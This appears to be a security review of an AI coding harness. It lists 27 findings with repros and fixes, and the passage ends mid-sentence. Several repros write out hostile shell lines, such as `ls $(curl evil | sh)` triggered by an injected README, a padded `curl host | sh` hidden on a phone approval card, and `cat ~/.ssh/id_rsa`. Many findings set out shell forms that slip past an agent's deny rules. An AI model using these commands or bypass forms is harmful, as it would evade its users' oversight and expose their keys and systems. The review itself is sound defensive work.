# Security review of the harness's own attack surface (2.0.10 round 2; fixed in rounds 3-5, see plans/briefs/2.0.10-review/SWEEP.md)

Scope: `plans/2.0.9-review-privacy-brief.md` section A2, all seven areas, at
HEAD after 2.0.10 round 1. Method: each area walked with the code open (by
symbol), the threat model in `docs/REMOTE.md` read first, and every finding
reproduced or traced to the line before it was written down. This round
changes nothing under `halo_harness/` or `tests/`; the fix rounds follow
(split at the end of this file). Standing contract honoured: deny rules hold in every
mode, auto mode with no rules stays allow, and nothing here proposes a new
gate or command allowlist -- the permission findings are about whether the
user's OWN rules do what they say.

Format: **number, title** / location / what happens / evidence / one-line fix
/ severity. Severity is high (code runs, or a rule the user wrote does not
hold, with no user action beyond opening a repo or running an allowed
command), medium (a credential or a boundary is weaker than documented, or
needs a precondition), low (hardening with a concrete scenario).
Repros used scratch homes (`BRIDGE_TEST_HOME`), never `~/.halo`.

Order: remote control first (finding 1 is the seed), then trust boundaries,
the permission engine, credentials, subprocesses, file tools and state,
supply chain. 27 findings: 7 high, 12 medium, 8 low.

## A. Remote control (2.0.9) -- `halo_harness/remote/`

**1. `phrase_to_secret` accepts an empty phrase or any word count** (medium)
`remote/signing.py:59`. `bytes(_INDEX[w] for w in phrase.lower().split())`
never checks length. Repro: `phrase_to_secret("") == b""`,
`phrase_to_secret("acorn alarm amber") == b"\x00\x01\x02"`. A 32-byte secret
is the contract (`SECRET_BYTES`); a short or empty key is a valid HMAC key,
so a signing app (or a future restore-from-phrase path) that feeds a
mistyped phrase through this function signs with a key anyone can guess,
and no error is shown. Today only tests call it, so this is latent; it is
the documented phrase-to-key path for any signing app. (confirmed by halo
review) Fix: raise `ValueError` unless exactly `SECRET_BYTES` words.

Fixed in round 5: `phrase_to_secret` raises `ValueError` unless exactly 32 known words; `secret_from_hex` and the new `parse_pair_uri` accept exactly 64 hex characters and the documented `v`/`alg`/`len` (`test_f1_*`).

**2. The signing secret is delivered inside the Signal chat it protects** (medium)
`remote/bridge.py:198`. On redeem the bridge replies "Paired. Signing secret
(shown once)" with the 32 words and the `halo-remote://` link in the same
conversation. That message stays in the phone's history and in Signal backups
with no expiry. In `linked` mode the chat is Note to Self, shared by every
device of the account, so a device linked later (some Signal clients offer
message-history transfer when linking) can read the secret, which is the
exact case layer 3 of `docs/REMOTE.md` says the secret defends against. Scenario: attacker links a device to the
owner's account, reads Note to Self history, signs commands. (confirmed by halo review) Fix: show the
phrase/QR only on the computer (`cli_pair.show_pairing`) and send the phone
nothing but "Paired"; or send it once and delete the message.

Fixed in round 5: the chat reply after pairing is "Paired. Your signing phrase is on the Halo screen." and nothing else; the phrase and link are shown only by `halo remote signal pair` and the /remote dialog (`test_f2_*`).

**3. The phone permission card truncates the command and hides what "3" persists** (medium)
`remote/bridge_cards.py:16,27-45`. `ONE_LINE = 160` cuts the command, collapses
whitespace and newlines, and shows only the first of
`command/file_path/path/url/...`; the card lists "3 always allow" without
the rule text (`suggested_rule` is in the event but never shown). Scenario:
a model emits `echo ok<150 chars of spaces>; curl host | sh`; the phone shows
`echo ok ...`; the owner taps 1 or 3. For `3`, `Bash(sudo:*)`-style
suggestions persist silently. Fix: show up to ~1500 chars with an explicit
"+N more characters" marker (long ones as the existing text attachment) and
append the rule text to option 3.

Fixed in round 5: the card shows the whole command (newlines and spacing kept; over 1500 characters it goes as its own message or attachment, the choices after it) and option 3 reads `3 always allow (saves rule: <rule>)`, or says nothing is saved (`test_f3_*`).

**4. A peer with `signed: true` and no secret verifies against an empty key** (medium)
`remote/bridge.py:219`, `signing.verify`. `bytes.fromhex(sg.get("secret_hex") or "")`
turns a missing or empty secret (hand-edited `peers.json`, older schema, a
failed pairing write) into `b""`; `hmac.new(b"", ...)` works, so any sender
who knows the (public) MAC format signs commands. Repro: `signing.sign(b"", 1,
"/status")` passes `verify(b"", 0, ...)`. Fix: treat a missing or non-64-hex
secret as "peer not usable" (audit + notice), never as an empty key. (confirmed by halo review)

Fixed in round 5: a `signed: true` peer whose secret is missing or not 64 hex characters refuses every command, audits `no_secret`, replies with a re-pair notice and leaves a notice on the computer; `signed: false` is the only unsigned path (`test_f4_*`).

**5. Pre-verification rate limit, unbounded audit/contact tables** (low)
`bridge.py:210`, `audit.py:69`, `pairing.py:119`, `pairing_files.py:20`.
(a) The limiter runs before the signature check, so unsigned or garbled
messages from the same ACI (any device of the account in `linked` mode, or
the owner's own Note to Self notes) spend the 30/min budget and trigger
"Too many commands" replies; a flooding device locks the real phone out
each minute. (b) Every drop is still appended to `audit.jsonl`, which has
no size cap or rotation. (c) `MAX_PENDING = 20` contact requests never
expire (only approved-and-expired ones are hidden), so 20 throwaway Signal
accounts permanently block new pairings until the owner prunes by hand.
(d) `step()` swallows every exception without a log, and the audit line is
written after `route`, so a command that raises mid-way leaves no trace
(confirmed by halo review). (e) On Windows the 32 connection slots of the
control socket (`control_socket.py:219`) count unauthenticated connections for
the 5 s handshake, so a local process looping 32 silent connects starves the
bridge and CLI (confirmed by halo review). Fix: count only verified commands against the budget (bad MACs get a
separate, stricter counter), cap/rotate the audit file, expire pending
requests after a day, log and audit handler exceptions, count only
authenticated connections against `MAX_CONNS`.

Fixed in round 5: the signature check runs first and only verified commands spend `rate_per_minute` (bad ones have a separate counter of at most 10 a minute); `audit.jsonl` rotates at 5 MB into `audit.jsonl.1`; pending contact requests are capped at 32 and the oldest unapproved one is dropped; handler exceptions leave an audit line; control-socket connections still in the Windows handshake sit in their own pool of 16 and at most 16 connections hold a feed. Not done: expiring pending requests after a day (the cap replaces it) (`test_f5_*`).

## B. Trust boundaries -- `mcp/`, `config/settings.py`, `init_cli.py`

**6. An untrusted repo approves its own `.mcp.json` servers** (high)
`config/settings.py:18` (`_TRUST_GATED_TOP_KEYS`), `mcp/manager.py:572-583`.
The trust filter drops `env`, `hooks`, `permissions.allow` and
`autoMemoryDirectory` from an untrusted project layer, but not
`enableAllProjectMcpServers` / `enabledMcpjsonServers`; and `print_mode`
approves every `.mcp.json` entry outright. Repro (scratch repo, `is_trusted`
False): `.claude/settings.json` = `{"enableAllProjectMcpServers": true}` plus
a `.mcp.json` stdio entry gives `pending_approval == False`; `print_mode=True`
alone gives the same. The entry's `command` is spawned at startup, or at the
first ToolSearch (`mcpLazy` defaults on), as the user. Scenario: clone a
repo, run `halo` or `halo -p` in it. Fix: add both keys to the trust gate,
approve in `-p` only from user/managed scope or a hash-keyed approval, and
ask once in the TUI. (print-mode half confirmed by halo review) 

Fixed in round 3: `enableAllProjectMcpServers`/`enabledMcpjsonServers` are trust-gated and `-p` approves `.mcp.json` servers only in a trusted folder (`test_f6_*`).

**7. A project `statusLine.command` runs in an untrusted folder** (high)
`config/settings.py:171`, `tui/app.py:602,1160-1175`, `statusline.py:60`.
`statusLine` is not in the trust gate and the TUI runs it on the first
frame and every 5 s (`shell=True`). Repro: `resolve_settings(repo,
trusted=False).statusline` returns `{"type":"command","command":"echo pwned"}`
from the repo's `.claude/settings.json` while `env` is correctly dropped.
Scenario: open any cloned repo in the TUI. The same layer may also set
`permissions.defaultMode: acceptEdits` (`settings.py:279`), so edits such as
`.git/hooks/post-checkout` need no prompt. (statusLine half confirmed by halo
review) Fix: add `statusLine` (and any
other key that names a command) to `_TRUST_GATED_TOP_KEYS`.

Fixed in round 3: `statusLine` and the other command-naming keys (`apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`, `gcpAuthRefresh`, `otelHeadersHelper`) are trust-gated (`test_f7_*`). `permissions.defaultMode` in an untrusted layer is unchanged (not in this finding's fix).

**8. OAuth endpoints from server metadata reach `webbrowser.open` and the token POST unchecked** (high)
`mcp/oauth.py:104-116,214-220,259,292`. `authorization_endpoint` and
`token_endpoint` come from the config or from
`/.well-known/oauth-authorization-server` on the server's own origin; the
authorize URL is printed and passed to `webbrowser.open` with no scheme check.
On Windows that hands the string to ShellExecute (`file:`, `ms-*:`, a path),
on Linux to `xdg-open` (any registered scheme). The token and refresh calls
use `urlopen` on the same unchecked value, so `file://`/`http://` endpoints
work (plaintext `http` endpoints confirmed by halo review), and every refresh re-discovers the endpoint, so a server that changes
its metadata later receives the stored `refresh_token` and `client_secret`.
Scenario: add a remote MCP server, run `halo mcp login`; its metadata says
`"authorization_endpoint": "<custom-scheme>:..."`. Fix: accept only
`https` (or loopback `http`) for both endpoints, pin the token endpoint in
the stored token file at login and use that one for refresh.

Fixed in round 3: endpoints must be https or loopback http, and the token endpoint is pinned at login and used for refresh (`test_f8_*`).

**9. Server names containing `__` collide in the `mcp__<server>__<tool>` namespace** (medium)
`mcp/manager.py:197-212`, `permissions.py:1163,2084`. The name is split at
the first `__`, so server `github__evil` with tool `x` is
`mcp__github__evil__x`, which a server-level rule `mcp__github` matches.
Repro: allow `mcp__github`; `decide("mcp__github__evil__x")` is `allow`.
`suggest_rule` also cuts a tool name at its own `__` (`mcp__srv__do__thing`
-> `mcp__srv__do`), producing an "always allow" rule that never matches.
`suggest_rule` also leaves `*` in a command token unescaped, so the card
offers `Bash(docker *:*)` for the call `docker * --privileged`. (the `__` alias
confirmed by halo review) Fix: reject or rename server names containing `__`; build rules from the
registered (server, tool) pair, not by splitting the wire name.

Fixed in round 3: server names with `__` become disabled placeholders; `suggest_rule` keeps the whole tool name and escapes `*` (`test_f9_*`).

**10. A project `.halo/team.json` chooses the Databricks host `halo init` stores a token for** (medium)
`team_config.py:34`, `init_cli.py:283-304`, `init_providers.py:372`,
`tui/dialogs/init_wizard.py:413`. With Databricks unconfigured the wizard
prints "Databricks host configured: <host from the repo> -- only the token
is needed", prompts for the token, writes `DATABRICKS_HOST` and
`DATABRICKS_TOKEN` to the env file, and later calls send the token to that
host. No scheme check, no domain check, and the source (a file inside the
cloned repo) is not named. Fix: name the source path, require `https`, and
ask the user to retype or confirm the host when it came from a project file.

Fixed in round 3: https only; a host from a project file is named and retyped before a token is stored, in `halo init` and the wizard (`test_f10_*`).

## C. Permission engine -- `permissions.py` (correctness of the user's rules)

**11. An explicit Bash allow rule also allows command substitution inside its arguments** (high)
`permissions.py:861-884` (`bash_allow_matches`). Deny/ask scan `$(...)`,
backticks, `<(...)` and group bodies; allow does not, and the splitter keeps
a `$( )` inside its parent segment. Repro (default mode, rules
`Bash(ls:*)`, `Bash(cat:*)`, `Bash(git status:*)`): `ls $(curl x|sh)`,
ls with backticks around `id`, `cat <(rm x)`, `git status > f` and
`cat f > /etc/x` all return `allow`. With NO rules the mode table correctly asks for the same inputs
(`ls $(touch x)` -> `ask`), so the gap is only on the explicit-rule path.
Scenario: the user allowed `ls`; an injected README makes the model run
`ls $(curl evil | sh)` with no prompt. Fix: in `bash_allow_matches`, require
that a segment with substitution/process-substitution/redirection-to-file
also passes the read-only check for each body (or fall through to the mode
table), exactly as the no-rules path already does. (confirmed by halo review)

Rejected by the standing contract (allow side): an explicit allow rule keeps matching exactly as before, and no heuristic about which commands are dangerous is added. The deny side of the same shape (a user's deny or ask rule seeing the body of `$(...)`, backticks, groups) is covered by 12 and was already in place for substitution bodies (`test_f11_rejected_allow_side_is_unchanged`).

**12. Deny and ask rules are skipped by shell compound keywords and some wrappers** (high)
`permissions.py:397-480,574,600-632`. `split_bash_segments` splits on
`; && || |` but leaves `then`, `do`, `else`, `!` and `exec` glued to the
command, so the prefix never starts with the denied word. Repro (mode auto,
deny `Bash(rm:*)`): `if true; then rm x; fi`, `for f in a b; do rm $f; done`,
`while true; do rm x; done`, `! rm x`, `exec rm x`, `case a in a) rm x;; esac`
all return `allow`; `true && rm x`, `(rm x)`, `{ rm x; }`, `env rm x`,
`sudo rm x` correctly `deny`. Wrappers `watch`, `flock`, `unshare`, `chroot`,
`strace`, `fakeroot`, `nsenter` are not in the strip list either. A `for ...
do git push ...; done` loop is an ordinary thing for a model to write.
PowerShell deny/ask has no opaque re-exec handling at all (`powershell
-Command "iex ..."` hides its payload) and the Bash guard misses `sh <<EOF`
(confirmed by halo review). Fix:
strip leading `then|do|else|elif|if|while|until|!|exec|{` words from every
segment candidate and add the wrappers above to `_DENY_STRIP_WRAPPERS`.

Fixed in round 4: a deny or ask rule follows the command through `if/then/elif/else`, `for/do`, `while/until`, `!`, `time`, `exec` and `case` arms; through `watch`, `flock`, `unshare`, `chroot`, `strace`, `ltrace`, `fakeroot`, `nsenter`, `taskset`, `chrt`, `setarch`, `runuser`, `pkexec`, `busybox` and a few siblings (options and positional operands skipped); and through `-c` payloads (`flock f -c ...`) and `find -exec`. `bash -lc`, `sh <<EOF`, `... | sh` ask when a Bash deny/ask rule exists. PowerShell: script blocks, groups, the call operator, quoted command names, and the strings given to `powershell -Command` / `cmd /c` reach the rule; `iex` and `-EncodedCommand` ask when a PowerShell deny/ask rule exists. The allow side and auto mode with no rules are unchanged (`test_f12_*`, `halo_harness/perm_shell.py`, `perm_ps.py`).

**13. Tool-global options between the binary and the subcommand defeat prefix rules** (medium)
`permissions.py:886-930`. Repro (deny `Bash(git push:*)`): `git -C /x push`,
`git --no-pager push`, `git --git-dir=.git push --force` return `allow`
(`git push`, `git  push`, `/usr/bin/git push`, `FOO=1 git push` deny).
Same shape for `docker -H h run`, `kubectl -n ns delete`, `npm --prefix x
publish`. Fix: for deny/ask candidates, also generate the form with the
tool's leading `-x`/`--opt[=v]` words removed (table per multi-word verb in
`_MULTI_WORD_VERBS`).

Fixed in round 4: the deny/ask candidates for a command also carry the form without the tool's leading global options (`git -C x push`, `docker --context x run`, `docker compose -f f up`, `kubectl -n x delete`, `npm --prefix x publish`, `cargo +nightly publish`, `terraform -chdir=x apply`, `make -C x deploy`, `aws`, `helm`, `gh`, `uv`, `pip`, `yarn`, `pnpm`, `systemctl`); allow matching is untouched (`test_f13_*`).

**14. A malformed deny or ask rule is silently inert** (medium)
`permissions.py:1023-1063,1438`. `parse_rule` returns `kind="invalid"` with an
`error`; `_rule_matches` returns False; only the agent bio editor and hook
`if` print the error. Repro: `Bash(rm:* -rf)` -> `invalid: The :* pattern
must be at the end`; in auto mode `rm -rf /tmp/x` is `allow`. A user who
typo'd a deny rule in `settings.json` believes it holds. Fix: collect
invalid settings/CLI rules in `build_rules_from_settings` and print one
line at startup, in `halo doctor` and in `/permissions`.

Fixed in round 4: a malformed deny/ask rule is named in one load line on stderr (once per distinct text), in `/permissions` (headless: "Inactive deny rule ...", TUI: marked `[INACTIVE: reason]`), and in `halo doctor` (`permission_rules`, silent when every rule parses). It is never rewritten into another rule (`test_f14_*`).

**15. Read deny/ask path rules do not reach `cat ~/...`, Grep/Glob over a directory, or most Bash readers** (high)
`permissions.py:1111-1128,1498-1541,1538-1570`. Rules match only the literal
path handed to the tool, and `_bash_read_deny_hit` resolves a `~` token as
`<cwd>/~/...`. Repro (auto mode, deny `Read(~/.ssh/**)`; Linux and Windows):
`cat ~/.ssh/id_rsa` and `head -1 ~/.ssh/id_rsa` return `allow` (the absolute
spelling returns `deny`). Repro (deny `Read(./.env)`): `Read .env` -> `deny`,
but `Grep pattern=K path=<repo dir>`, `Glob` over the dir, and Bash
`grep K .env`, `sed -n p .env`, `awk 1 .env`, `cp .env /tmp/o` -> `allow`
(`_BASH_FILE_READERS` has 20 names, no grep/sed/awk/cp). Scenario: the user
denies key-file reads and the model runs `cat ~/.ssh/id_rsa`. (the `~` case
confirmed by halo review) Fix: expand `~` in `_bash_read_deny_hit`; for
Grep/Glob evaluate the Read rules against each matched file path before
returning results (deterministic, no command list); add
grep/egrep/fgrep/sed/awk/cp/tar to the reader set.

Fixed in round 4: Bash readers for Read deny/ask rules now include `grep`/`egrep`/`fgrep`/`rg`/`ag`, `sed`, `awk`/`gawk`/`mawk`, `cp` (sources only), `tar`, `sort`, `uniq`, `cut`, `paste`, `diff`, `cmp`, `jq`, `bat`, `base64` and the checksum tools, with the pattern or script word skipped; `~`, `$HOME` and `${HOME}` expand, `< file` counts, glob words expand against the live cwd, and `$()`/group bodies and `find -exec` payloads are scanned. Grep and Glob skip every file a Read deny rule names (`PermissionEngine.read_denied`, applied in both Grep backends and in Glob), and a directory-wide Grep/Glob asks when a Read ask rule names a file below it. Residual: a recursive Bash reader over a directory (`grep -r K .`) is not expanded (`test_f15_*`).

**16. A path rule whose own text contains a symlink never matches** (low)
`permissions.py:295-337` (`path_rule_regex`). The target is resolved with
`Path.resolve()` (symlinks followed) but `~/` and `//abs` rule values are
used as written. Repro on Linux: `link -> real`; deny `Read(//<link>/**)`,
read `<link>/secret.txt` -> `allow`; deny `Read(//<real>/**)` -> `deny`. Hits
macOS (`/tmp`, `/var`), a symlinked home, a bind-mounted work tree. On Windows
a trailing dot or space (`C:\proj\.env.`) is judged as written while
`open()` opens `.env`, so a `Write(.env)` deny does not match (confirmed by halo
review).
Fix: `resolve()` the non-wildcard prefix of absolute rule values too.

Fixed in round 4: the non-wildcard prefix of an absolute rule (`//abs`, `~/`, drive form) and of a relative rule is resolved through symlinks as well as written, and the rule matches either spelling. On Windows a deny/ask match also judges the name the OS opens (trailing dots and spaces, `::$DATA` stripped); the allow side is not widened (`test_f16_*`).

## D. Credentials -- `redact.py`, `providers/`, `mcp/oauth.py`, `permissions.py`

**17. Both redactors leak real secret shapes: `--sanitize` exports and `bridge.log`** (high)
(a) `redact.py:77-110,176,117,268`, used by `halo export --sanitize`,
`/export --sanitize`, `config show` and bug reports. Repro: `sanitize_node` on
a Read result whose text is a `settings.json` excerpt
(`"MY_SERVICE_TOKEN": "tok_live_a1b2c3d4e5f6g7h8"`) returns it unchanged,
because after the node is JSON-dumped the pair reads
`\"NAME\": \"value\"` and the key's closing-quote group (`mid_q`) does not
accept the backslash JSON escaping puts before it, so the pair never matches
(the bare `sanitize_text` of the same line works).
Also unredacted: `https://user:token@host/...`
(`_URL_CRED_RE` covers DB schemes only: git remotes, pip/npm index URLs),
values containing a backslash (only the prefix is cut), all-digit values
(`PIN=123456`), and `known_secret_values` that contain a character JSON
escapes. Scenario: a user shares a "sanitized" transcript that still holds a
token or a git remote credential. (confirmed by halo review) Fix: run the
redaction on the extracted text fields of each node (and on the JSON text),
extend `_URL_CRED_RE` to any `scheme://user:pass@`, drop the numeric
exclusion for names that match the secret list, and add the escaped variant
of each known value.
(b) `providers/config.py:1213-1226` (`RedactingFormatter`, for
`~/.halo/bridge.log`) is a second, much weaker redactor.
Repro: `Authorization: Bearer sk-or-v1-abc...` becomes `Authorization:
[REDACTED] sk-or-v1-abc...` (the word is redacted, the key survives);
`{'Authorization': 'Bearer sk-or-...'}` is cut mid-token; `?api_key=SECRET`,
`{'api_key': 'SECRET'}`, `OPENROUTER_API_KEY=sk-or-v1-...` and an upstream
error body echoing `Incorrect API key provided: sk-...` pass unchanged.
Scenario: any `log.warning` that formats a header dict or an upstream error
body writes the key into a file that is world-readable (finding 24). Fix:
make `RedactingFormatter.format` call `redact.sanitize_text`.

Fixed in round 3: leaf-first redaction in `sanitize_node`, any-scheme URL credentials, backslash/numeric/PIN values, escaped known values, header dicts, and `RedactingFormatter` uses `sanitize_text` (`test_f17_*`).

**18. HTTP redirects carry credentials to the new host** (medium)
`providers/http.py:325-373` (`_OfflineAwareRedirectHandler`, used by
`urlopen_tls`). The handler only adds the offline check; urllib keeps every
request header except content-length/type across a 301/302/303. Repro: a
server on 127.0.0.1 answering 302 to `localhost:<other port>`; the target
receives the sender's `Authorization` header value unchanged. Callers that send credentials
through it: WebSearch (the OpenRouter key, `tools/websearch.py:75-88`) and
HTTP hooks with user headers (`hooks.py:613`).
Scenario: a configured base URL, hook endpoint or gateway that redirects.
The same handler also follows an https-to-http downgrade. (confirmed by halo
review) Fix: override `redirect_request` to drop `Authorization`, `x-api-key` and
user-supplied headers when scheme or host change.

Fixed in round 3: a redirect that changes scheme, host or port keeps only plain transport headers (`test_f18_*`).

**19. Two child-process paths skip the secret-stripping environment** (low)
(a) `remote/signal_link.py:159` and `remote/cli_common.py:103` start signal-cli
(a downloaded third-party binary) with the full environment, the provider
keys loaded from the env file included. (b) `mcp_setup.py:269-274`: `${VAR}`
in a `.mcp.json` entry expands from `settings.effective_env` (unstripped)
while the server's base env uses `tool_child_env`; `{"env":{"K":
"${OPENROUTER_API_KEY}"}}` hands the key to an approved server, against the
stated intent of `tool_child_env`; `mcp list` prints the expanded `url` of a
`?token=${PAT}` entry unmasked (confirmed by halo review). Fix: pass `tool_child_env(os.environ)` to
signal-cli; expand from the stripped dict.

Fixed in round 3: signal-cli and `${VAR}` expansion use `tool_child_env`; `mcp list`/`get` show the url without its query (`test_f19_*`).

**20. Secret files are written then chmod'd, or rewritten without their mode** (low)
`providers/config.py:1147-1155` (`ensure_token`: proxy token via `write_text`
then `chmod`; `bridge.py:550,570` compares `token != SERVER_TOKEN`, not
constant-time), `mcp/oauth.py:73-79`, `theme.py:180-195`,
`config/paths.py:290-295`: a world-readable window under a normal umask.
`permissions.py:1291-1294` (`add_allow_rule`) rewrites
`~/.claude/settings.json` (whose `env` block can hold tokens) through a fresh
temp file, so a 0600 file lands 0644. (the oauth temp file confirmed by halo review) Fix: `privateio.write_private_atomic`
plus copy the old mode; `hmac.compare_digest` for the proxy token.

Fixed in round 3: `write_private_atomic` for the proxy token, OAuth tokens, `config.json` and the env import; `add_allow_rule` keeps the file mode; `hmac.compare_digest` for the proxy token (`test_f20_*`).

## E. Subprocesses and shells

**21. The signal-cli archive is installed and run without a pinned digest** (medium)
`remote/signal_install.py:128-190`. `verify_signature` returns `no-gpg`,
`no-signature` or `unverified` (key not in the keyring) and the install
carries on; only `bad` stops it, and `verified` means "some key in your
keyring signed it". The tarball is then extracted (`extractall` with no
`filter=`; link members are rejected, mode bits kept), chmod 755 and run with
the Signal account keys and the whole environment (finding 19). The version is
pinned, so the digest can be. Fix: embed the SHA-256 of each pinned asset and
stop on mismatch (keep gpg as the extra check); `extractall(filter="data")`,
which also drops device and FIFO members. (the gpg-any-key and fail-open
paths and the device members confirmed by halo review)

Fixed in round 5: the SHA-256 of each pinned 0.14.9 asset (read from the release API, `assets[].digest`) is checked before unpacking and an unpinned asset refuses; gpg counts only when the signature is made by `RELEASE_KEY_FINGERPRINT` (left empty: the key was not fetched, so setup reports `digest-only`); extraction rejects device, FIFO, link, absolute and `..` members and uses the `data` filter when available (`test_f21_*`).

**22. The `cc:` route trusts `--tools ""` and never checks it** (low)
`agent/cc_process.py:98-150`. The child `claude` runs with
`--permission-mode bypassPermissions`; halo's rules apply only because
built-ins are removed by `--tools ""`. The fallback argv exists but nothing
inspects `system.init.tools`. If a claude release changes that flag, built-in
Bash/Write run with no halo rules and no hooks. Fix: compare the init tool
list to the bridged set and end the turn with a plain error when a built-in
is present.

Fixed in round 5: the first `system.init` is checked and a built-in (non `mcp__`) tool name ends the turn with a plain error, stops the child, and the next turn starts a fresh child that is checked again (`test_f22_*`).

**23. The registration-lock PIN and SMS code travel on argv** (low)
`remote/cli_setup.py:136-147`, `cli_common.run_cli`: `signal-cli setPin <pin>`
and `verify <code> --pin <pin>` are visible to every local account in
`ps` for the duration of the call; the PIN gates re-registration of the number.
Fix: pass through a form that does not use argv if signal-cli has one; else
document the window and run under `hidepid`.

Fixed in round 5: `setPin` goes through a `signal-cli jsonRpc` child's stdin and `verify --pin` is tried there first; signal-cli 0.14.9 has no JSON-RPC `verify`, so `--pin` then goes on argv for that one call and the command says so (`test_f23_*`).

## F. File tools and `~/.halo`

**24. The state tree is created world-readable** (medium)
`agent/log.py:49-57`, `shadow.py:126,234`, `providers/config.py:1242`
(`bridge.log`), `config/paths.py` (never chmods `~/.halo`). Evidence (Linux,
umask 022): `~/.halo` 0755, `sessions/` 0755, `<session>.jsonl` 0644. They
hold every prompt, every tool result (file reads, `env` output) and, in the
shadow repo, a full copy of each edited file. Only `history.jsonl` (mode set at creation only), `config.json`, `state.json`,
`remote/` and `run/` are tightened. Scenario: a
shared lab VM or CI runner; another account reads transcripts. Fix:
`ensure_private_dir(bridge_home())` on first use, 0600/0700 on create (or
`umask 077` around the writers), and a one-time tighten in `halo doctor`.

Fixed in round 4: directories the harness creates under the state dir (sessions, shadow, `tool-results`) are 0700 and transcripts, `shadow-index.jsonl`, spilled tool results and `bridge.log` are created 0600 (`private_mkdir`, `private_opener`); `halo` tightens an existing tree once per state dir (marker `.modes-v1`, one stderr line) and `halo doctor` re-tightens on demand. No-op on Windows (`test_f24_*`).

**25. Provider- and CLI-supplied identifiers are used as file names** (low)
`tools/truncate.py:73-79`, `tools/mcp_tool.py:376-380`:
`results_dir / f"{tool_use_id}.txt"`, with the id kept verbatim for
"preserve" profiles (`providers/hooks.py:132`, `oai_stream.py:463`). An id of
`../../x` writes the tool output text to `<anywhere>/x.txt`. Likewise
`agent/log.py:52` joins `--resume <id>` into `sessions/<slug>/<id>.jsonl`
unchecked, so an id with separators appends the transcript outside the state
dir (confirmed by halo review). Fix: map each id through `re.sub(r"[^A-Za-z0-9._-]", "_", id)` at the join.

Fixed in round 4: a session id that reaches `SessionLog` is validated (`^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$`, otherwise `ValueError: invalid session id ...`), `--resume <value>` only treats a safe value as an exact id, and a provider `tool_use_id` becomes a safe file stem (`functions.Read:0` -> `functions.Read_0`, separators and leading dots replaced) in both spill writers. Deviation from "reject": a tool id is mapped to a safe name rather than turned away, so a legitimate tool call with an id like `functions.Read:0` keeps its spill file (`test_f25_*`).

## G. Supply chain

**26. The install channel is mutable and unverified end to end** (medium)
`README.md:82,87`, `docs/INSTALL.md:24,75`, `scripts/install-halo.sh`,
`install-halo.ps1`. The documented one-liners pipe the script from the
`master` branch (`curl | bash`, `irm | iex` with `-ExecutionPolicy ByPass`);
the script pipes uv's installer (`curl | sh`, no version or hash) and runs
`uv tool install --reinstall .` from a `git pull --ff-only` of master or
`git+<repo>` with no tag. There are no signed tags, checksums or release
files to compare. Scenario: one compromised push or a DNS/CDN fault for the
raw host runs code on each installing machine. Fix: publish tagged releases
with a SHA-256 file, make the one-liner fetch a tag and verify it, pin the
uv installer version.

Fixed in round 5: the scripts install the newest `vX.Y.Z` tag (`--ref` / `-Ref` overrides), print the tag and the commit, pin the uv bootstrap version and install with `--constraints requirements.lock`; the README one-liners fetch the script from a tag URL. Not done: signed tags or a checksums file for the script itself (`halo update` already checks release checksums) (`test_f26_*`).

**27. Dependencies resolve unpinned and are never audited** (low)
`pyproject.toml` (`mcp>=2.2,<3`, `rich>=14,<16`, `pyyaml>=6,<7`; only textual
exact); `requirements.lock` has no hashes and neither the installer nor CI
installs from it (`pip install -e ".[dev]"`); `.github/workflows/suites.yml`
has no `pip-audit` step and pins actions by tag (`@v4`, `@v5`). Scenario: a
bad in-range release of `mcp` reaches the next installer. Fix: CI step
`pip-audit -r requirements.lock`; install from a hashed lock; pin actions by
commit.

Fixed in round 5: `requirements.lock` is regenerated with hashes (`uv pip compile pyproject.toml --universal --generate-hashes -o requirements.lock`, existing pins kept; `pyyaml` was missing from the old file), CI installs it with `pip install --require-hashes --no-deps` and runs `scripts/pip_audit_gate.py` (pip-audit with `.github/pip-audit-allowlist.txt`) in both jobs. `uv tool install` does not enforce hashes (tested), so the installers constrain versions only. Not done: pinning actions by commit (`test_f27_*`).

## Second opinion (`halo review`, security dimension, glm-5.3-flash)

Run as `halo review <area paths> --level medium --dimensions security
--model or:z-ai/glm-5.3-flash --json`. The first six runs went in parallel and
all hit the 600 s limit (the shared provider lock serialises them); they were
re-run one at a time on narrower file sets. Results: remote 7 confirmed,
permissions 6, trust boundaries 11, credentials 9, file tools and state 8
(cents each, 7 to 10 minutes). The subprocess run (`_proc`, `bash`, `hooks`,
`plugin_fetch`) timed out again at 600 s and was skipped; that area rests on
this review's own walk. Every confirmed item that matched a finding above is
marked "(confirmed by halo review)" in place. New in this pass because of the
reviewer: the `cat ~/...` bypass (15), the nested-JSON redaction miss and
URL credentials (17a), `statusLine` independent of my trace (7), the `sh <<EOF`
and PowerShell gaps (12), device members in the tar (21), unbounded
control-socket slots and the swallowed handler exceptions (5), the
`session_id` path (25), the Windows trailing-dot alias (16).

Reported by the reviewer and left out as not findings (cosmetic, platform
corner cases or by design): git `--ext-diff`/textconv helpers in the read-only
git list, the stale-socket sweep racing a slow accept (`ccbridge/server.py:65`),
relative `project` values in prompt history, a lone-surrogate session that
cannot resume, `latest_for_cwd` racing a delete, UNC paths in `/undo`,
malformed `allowedMcpServers` ignored rather than failing closed, escape
sequences in an OAuth `error_description`, and the user-facing proxy
credential sent in clear for an `http://` target behind an `https://` proxy.

## Residual risks (what the design does not protect against)

- A paired, signed phone (or anyone holding the secret) does everything the
  keyboard does; there is no content filter, by design.
- Bash and PowerShell rules are string matching: variable indirection
  (`x=rm; $x y`), `$IFS` splitting, interpreters (`python -c`), `find -exec`,
  aliases and unlisted wrappers escape any pattern.
- The signing MAC is 32 bits. Since round 5 the online bound is the bad-message
  counter (at most 10 unsigned or bad-MAC messages a minute per peer, about
  2^32/10 minutes of guessing for a holder of only the ACI) rather than the
  command budget; there is still no lockout after bad MACs.
- The pinned signal-cli digests come from the release page's own `digest` field,
  so they protect against a swapped or corrupted download, not against a
  compromised release; the gpg check adds nothing until the release key's
  fingerprint is filled in (round 5). `verify --pin` on a locked number still
  puts the PIN on argv for that one call (signal-cli 0.14.9 has no other form).
- `uv tool install` does not enforce the hashes in `requirements.lock` (tested
  in round 5): the installers constrain exact versions, and the hashes are
  enforced by `pip install --require-hashes` in CI.
- Secrets at rest are plaintext files, 0600 where tightened: the env file,
  `peers.json` signing secrets, OAuth tokens, signal-cli's key store, the
  registration PIN. No OS keyring.
- Transcripts keep whatever tools returned, secrets included, until exported
  with `--sanitize`; `redact.py` is best-effort.
- Another process running as the user reaches every control socket and reads
  all of the above; the Windows loopback port is open to every local account
  (token only); the Unix socket has no peer-credential check beyond mode 0600.
- Project skills, commands and agents can grant themselves temporary allow
